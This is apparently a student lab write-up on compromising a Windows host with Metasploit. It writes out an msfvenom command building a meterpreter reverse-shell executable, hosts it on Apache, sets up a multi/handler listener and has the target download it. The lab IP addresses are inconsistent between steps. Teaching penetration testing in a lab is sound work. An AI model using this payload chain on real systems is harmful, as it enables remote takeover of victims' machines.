# EX 06-Compromising-windows-using-Metasploit

Compromising windows using Metasploit



# AIM:

To Compromise windows using Metasploit .

# DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

1. Find the attackers ip address using ifconfig
#### OUTPUT:
<img width="1600" height="869" alt="WhatsApp Image 2026-08-27 at 9 33 13 AM (5)" src="https://github.com/user-attachments/assets/9e2c6638-7934-4404-a227-089519151809" />




2. Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
#### OUTPUT:
<img width="1600" height="869" alt="WhatsApp Image 2026-08-27 at 9 33 13 AM (6)" src="https://github.com/user-attachments/assets/87bfd74a-b963-4fbf-a317-4d8759faa748" />




3. copy the fun.exe into the apache /var/www/html folder
#### OUTPUT:
<img width="1600" height="869" alt="WhatsApp Image 2026-08-27 at 9 52 29 AM (2)" src="https://github.com/user-attachments/assets/a229769d-eef0-430e-8ec7-1b548a52ef84" />




4. Start apache server
sudo systemctl apache2 start
#### OUTPUT:
<img width="1600" height="869" alt="WhatsApp Image 2026-08-27 at 9 52 29 AM (2)" src="https://github.com/user-attachments/assets/a229769d-eef0-430e-8ec7-1b548a52ef84" />

5. Check the status of apache2
#### OUTPUT:
<img width="1600" height="869" alt="WhatsApp Image 2026-08-27 at 9 33 13 AM (7)" src="https://github.com/user-attachments/assets/3fbd6373-66f8-4d68-9b73-ad31bb71aa8c" />




6. Invoke msfconsole:
#### OUTPUT:
<img width="1600" height="869" alt="WhatsApp Image 2026-08-27 at 9 33 13 AM (8)" src="https://github.com/user-attachments/assets/b7a1a648-877d-4c8e-aee5-25cb832ed06a" />




7. Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
#### OUTPUT:
<img width="1600" height="869" alt="WhatsApp Image 2026-08-27 at 9 33 13 AM (9)" src="https://github.com/user-attachments/assets/c70e929f-ff35-410c-b724-8c4d3e435f7a" />


8. Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
#### OUTPUT:
<img width="997" height="906" alt="Screenshot 2026-08-27 100010" src="https://github.com/user-attachments/assets/70452802-9e53-43f0-8b4b-da169aad4c83" />




9. On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://172.28.85.192/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
#### OUTPUT:
<img width="1217" height="617" alt="Screenshot 2026-08-27 100705" src="https://github.com/user-attachments/assets/116f8e95-1222-46d4-a5d2-80e11fd47c81" />




# RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
